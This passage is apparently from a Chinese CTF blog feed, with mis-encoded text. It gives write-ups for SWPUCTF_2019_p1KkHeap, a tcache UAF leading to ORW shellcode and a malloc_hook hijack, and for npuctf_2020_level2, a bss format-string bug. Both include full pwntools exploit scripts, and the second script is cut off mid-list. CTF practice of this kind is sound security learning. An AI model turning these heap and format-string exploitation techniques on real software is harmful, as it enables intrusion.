ç¦ç”¨äº†<code>execve</code>ï¼Œå…¶å®ƒçš„åŸºæœ¬ä¸ç”¨ç®¡ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯<code>write</code>å‡½æ•°çš„<code>count</code>å¿…é¡»éè´Ÿï¼Œä¸”å¤§å°åœ¨32ä½intèŒƒå›´å†…ï¼Œå¹¶ä¸”ä¸èƒ½=0x10ï¼Œæœ‰ä¸€è¯´ä¸€è¿™ä¸ª0x10å¹¶ä¸ç†è§£ä¸ºå•¥é™åˆ¶è¿™ä¸ªä¸èƒ½ç­‰äº0x10ï¼Œå› ä¸ºæˆ‘è¯»<code>flag</code>ä¸€èˆ¬æ˜¯è¯»0x40</p><p>æˆ‘ä»¬çœ‹çœ‹åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°<code>mmap</code>åˆ†é…äº†ä¸€ç‰‡å¾ˆå¤§çš„å†…å­˜å¹¶ä¸”æ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æƒé™ï¼Œé‚£ä¹ˆå¼€äº†æ²™ç®±ä¹‹åæˆ‘ä»¬å°±èƒ½å¾€é‡Œé¢å†™<code>orw</code>çš„<code>shellcode</code>ï¼Œç„¶åå†åŠ«æŒæŸäº›ä¸œè¥¿è®©å®ƒè·³è½¬åˆ°è¿™ä¸ªåŒºåŸŸã€‚</p><p>åˆ†æé€»è¾‘ï¼Œ ç»å…¸å †èœå•é¢˜ç›®ï¼ŒåŒ…å«äº†å¢åˆ æ”¹æŸ¥ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ä¸€ç›´åœ¨++å¹¶ä¸”å¾ªç¯å¹¶éwhile 1ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªåˆå§‹å€¼ä¸º0x12ï¼Œæ„å‘³ç€æˆ‘ä»¬åªèƒ½æ“ä½œ18æ¬¡ã€‚å…ˆçœ‹åˆ é™¤ï¼Œå‘ç°åˆ é™¤æ²¡æœ‰æŠŠæŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨<code>UAF</code>ï¼Œä½†æ˜¯ä¼šæŠŠå¦ä¸€ä¸ªä¸œè¥¿æ¸…é›¶ï¼Œå¹¶ä¸”è·Ÿå¤–é¢ä¸€æ ·ï¼Œåˆ é™¤æœ‰æ¬¡æ•°é™åˆ¶ï¼Œåªæœ‰ä¸‰æ¬¡æœºä¼šã€‚æ·»åŠ å †å—ä¼šç°å¯»æ‰¾ç¬¬ä¸€ä¸ªæŒ‡é’ˆä¸ä¸º0çš„æŒ‡é’ˆï¼Œç„¶ååˆ†é…ï¼Œæœ€å¤šåŒæ—¶å­˜åœ¨å…«ä¸ªå †å—ï¼Œsizeè¢«é™å®šåœ¨0x100ä»¥å†…ã€‚<code>show</code>ä¼šç›´æ¥æ‰“å°å †å—ä¸Šé¢çš„ä¿¡æ¯ï¼Œ<code>edit</code>å°±æ˜¯æ ¹æ®è¾“å…¥çš„<code>size</code>è¯»å…¥æ•°æ®ï¼Œåˆ é™¤ä¼šå¯¼è‡´æ— æ³•editï¼Œä½†æ˜¯ä¸å½±å“showï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹å¯ä»¥ç”¨äºæ³„éœ²ï¼Œåé¢çš„åˆ©ç”¨ä¹Ÿéƒ½ä»¥uafä¸ºåŸºç¡€æ”»å‡»ã€‚</p><h2 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h2><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œglibcåœ¨2.26ç‰ˆæœ¬åŠ å…¥äº†tcacheï¼Œtcacheåœ¨å †ä¸Šç®¡ç†ï¼Œä¼šåˆ†é…ä¸€ä¸ª0x250å¤§å°çš„å †å—ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªtcache struct ä¸Šé¢ä¼šå­˜å‚¨æ¯ä¸ªsize tcache çš„ä¸ªæ•°å’Œtcacheç¬¬ä¸€ä¸ªå †å—çš„åœ°å€ã€‚é¦–å…ˆdouble freeç„¶åshow æ³„éœ²heapçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>æ³„éœ²äº†ä¹‹åæˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦ç”³è¯·å †å—åˆ°tcache structä¸Šé¢æ¥è¿›è¡Œä¸€äº›æ“ä½œæ–¹ä¾¿æˆ‘ä»¬ä¿®æ”¹æŸäº›ä¸œè¥¿ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯ä¸ªå¤§å°çš„tcache binæœ€å¤šå­˜åœ¨7ä¸ªï¼Œè¶…è¿‡åˆ™ä¼šå¯¹åº”è¿›å…¥fastbin æˆ–è€… unsorted binã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠsizeæ”¹æˆ7ç„¶åå†free å†showå°±å¯ä»¥æ³„éœ²libcçš„åœ°å€äº†ã€‚æˆ‘ä»¬è¿˜å¯ä»¥é¡ºä¾¿æŠŠç¬¬ä¸€ä¸ªtcacheçš„åœ°å€æ”¹æˆé‚£ä¸ªåˆ†é…çš„å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼Œç­‰ä¼šç›´æ¥ç”³è¯·å°±å¯ä»¥åœ¨ä¸Šé¢å†™æ•°æ®äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>æœ€åæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å†™shellcode orwç„¶ååŠ«æŒmalloc hookè€Œå·²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br></pre></td></tr></table></figure><p>æ¥çœ‹çœ‹ç»“æœå§</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/2.png" alt="2"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29949</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./SWPUCTF_2019_p1KkHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;=&#x27;)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>npuctf_2020_level2 writeup</title>
      <link href="/2021/11/10/npuctf_2020_level2/"/>
      <url>/2021/11/10/npuctf_2020_level2/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•â€”<a href="https://buuoj.cn/challenges#npuctf_2020_level2">npuctf_2020_level2</a></p><span id="more"></span><p>è¿™é¢˜åˆ·æ–°äº†æˆ‘å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ï¼Œæ¥åº·åº·å§ã€‚</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>ååˆ†ç®€å•ï¼Œå°±æ˜¯ä¸»å‡½æ•°whileå¾ªç¯è¾“å…¥ç„¶åæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶ä¸åœ¨stackæ®µè€Œæ˜¯åœ¨bssæ®µä¸Šçš„ã€‚é‚£å°±è€ƒè™‘è€ƒè™‘å­—ç¬¦ä¸²åœ¨bssæ®µå’Œåœ¨stackæ®µçš„åŒºåˆ«ï¼Œæˆ‘ä»¬å¹³æ—¶åšçš„éƒ½æ˜¯åœ¨stackæ®µçš„ï¼Œå› ä¸ºbufè¾“å…¥ä¸€èˆ¬éƒ½æ˜¯åœ¨printfè°ƒç”¨ä¹‹å‰ï¼Œæ‰€ä»¥printfçš„æ ˆå¸§ä¼šæ¯”bufä½ï¼Œè€Œå‚æ•°åœ¨é«˜åœ°å€ï¼Œé‚£ä¹ˆæ­¤æ—¶printfçš„å‚æ•°æˆ‘ä»¬å°±å¯æ§ï¼Œåœ¨bufä¸Šå†™ä¸Šä¸€ä¸ªåœ°å€ç„¶åç®—å‡ºåç§»ç”¨%næ ¼å¼ä¸²å»å†™å°±èƒ½åŸºæœ¬è¾¾åˆ°ä»»æ„titleå†™çš„ç›®çš„ã€‚ä½†æ˜¯å¦‚æœå®ƒåœ¨bssæ®µä¸Šæˆ–è€…æ˜¯åœ¨å †ä¸Šï¼Œé‚£ä¹ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°æ§åˆ¶ä¸äº†æˆ‘ä»¬å°±å¾—å¦å¯»æ–¹æ³•äº†ã€‚å…¶å®ä¹Ÿè¿˜å¥½ï¼Œç¬¬ä¸€æ­¥æˆ‘ä»¬å¯ä»¥å…ˆæ§åˆ¶ä¸€ä¸ªæ ˆçš„å‚æ•°ï¼Œæ ˆé‡Œé¢éƒ½ä¼šæœ‰å­˜å‡½æ•°çš„ebpï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å†™ä¸€ä¸ªç›®çš„åœ°å€ï¼Œå†é€šè¿‡ç›®çš„åœ°å€ä»»æ„å†™æˆ‘ä»¬æƒ³å†™çš„å†…å®¹ã€‚è®²ç®€å•ä¸€ç‚¹å…¶å®ä¹Ÿå°±æ˜¯æ§åˆ¶ä¸€ä¸ªæ ˆçš„åœ°å€ç„¶åå†™ä¸Šç›®çš„åœ°å€ï¼Œæœ€åå†å¾€ç›®çš„åœ°å€å†™ä¸œè¥¿ï¼Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é‚£ä¹ˆåŸºæœ¬stackï¼Œcodeå’Œlibcåœ°å€è·Ÿé€çš„ä¸€æ ·éšä¾¿æ³„éœ²ã€‚</p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>å…ˆgdbèµ·è¿™ä¸ªç¨‹åºï¼Œç„¶åè¿è¡Œåˆ°printfè¿™è¾¹è§‚å¯Ÿæ ˆæƒ…å†µã€‚</p><p><img src="/2021/11/10/npuctf_2020_level2/1.png" alt="1"></p><p>å¯ä»¥è§‚å¯Ÿåˆ°libcçš„åº”è¯¥æ˜¯ç¬¬7ä¸ªå‚æ•°ï¼Œç¬¬9ä¸ªå‚æ•°æœ‰ä¸€ä¸ªæ ˆåœ°å€ï¼Œç¬¬å…­ä¸ªå‚æ•°å’Œç¬¬11ä¸ªå‚æ•°æœ‰ä¸€ä¸ªç¨‹åºåŠ è½½åœ°å€å¯ä»¥æ³„éœ²ã€‚è¿™é‡Œçš„å‚æ•°ä¸ªæ•°æŒ‡çš„æ˜¯æ’é™¤æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°åçš„è®¡æ•°ï¼Œæ¯”å¦‚printf(â€œ%dâ€,1);è¿™é‡Œæˆ‘å°±ç›´æ¥æŠŠ1å½“æˆç¬¬ä¸€ä¸ªå‚æ•°äº†ã€‚</p><p>æ‰€ä»¥å¼€å±€ä¸‰ä¸ªåœ°å€éƒ½å‡ºæ¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥çœ‹åˆ°é‚£ä¸ªlibcå¾—åˆ°çš„å€¼å®é™…ä¸Šæ˜¯è¿”å›åœ°å€ï¼Œå› ä¸ºmainçš„çˆ¶å‡½æ•°å°±æ˜¯libc_start_mainå‡½æ•°å˜›ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¦å†™è¿™é‡Œï¼Œæ€ä¹ˆå†™å‘¢ï¼Ÿé€šè¿‡æ ˆåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ç¬¬9ä¸ªå‚æ•°çš„ä½ä¸¤ä¸ªå­—èŠ‚åˆ°è¿”å›åœ°å€ï¼Œç„¶åå†%nè¦†ç›–ï¼Œå› ä¸ºä¸èƒ½ä¸€æ¬¡å†™å¤ªå¤šï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡ä¿®æ”¹æœ€å¤šä¸¤ä¸ªå­—èŠ‚ï¼Œç„¶åé©¬ä¸ŠæŠŠè¿™ä¸ªåœ°å€å‘åç§»ä¸¤ä½ç„¶åå†å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œè‡³äºå†™ä»€ä¹ˆï¼Œé‚£è‡ªç„¶æ˜¯one_gadgetæœ€ç®€ä¾¿äº†ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå°±ç¬¦åˆæ¡ä»¶äº†ã€‚ä½†æ˜¯å®é™…æ“ä½œçš„æ—¶å€™æˆ‘å‚»äº†ï¼Œæˆ‘æ˜¯é€šè¿‡è¿™ä¸ªåœ°å€å†™åˆ°å¦ä¸€ä¸ªåœ°å€çš„ä½ä¸¤ä½å­—èŠ‚æ”¹æˆäº†è¿”å›åœ°å€å†é€šè¿‡é‚£ä¸ªå†™çš„ï¼Œç°åœ¨æƒ³æ¥æ˜¯åœ¨å¤šæ­¤ä¸€ä¸¾ï¼Œä½†æ˜¯è¿™æ ·çš„å¥½å¤„å°±æ˜¯å¯ä»¥å®ç°çœŸæ­£çš„ä»»æ„å†™ï¼Œå‡å¦‚è¿™ä¸ªé¢˜ç›®å˜æˆnoreturnï¼Œé‚£ä¹ˆå°±åªèƒ½é åŠ«æŒä¸€äº›hookæˆ–è€…gotè¡¨æ¥å®ç°æŒ‡ä»¤è·³è½¬äº†ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2.23 64 libcçš„one_gadgetæ¡ä»¶åˆ†åˆ«æ˜¯rax,[rsp+0x30,+0x50,+0x70]==NULL</span></span><br><span class="line"><span class="string">2.27 64 libcçš„one_gadgetæ¡ä»¶åˆ†åˆ«æ˜¯rsp&amp;0xf==0&amp;&amp;rcx==0 || [rsp+0x40ï¼Œ+0x70]==NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_2_23_32=[<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">one_2_23_64=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_2_23_buu32=[<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">one_2_23_buu64=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span 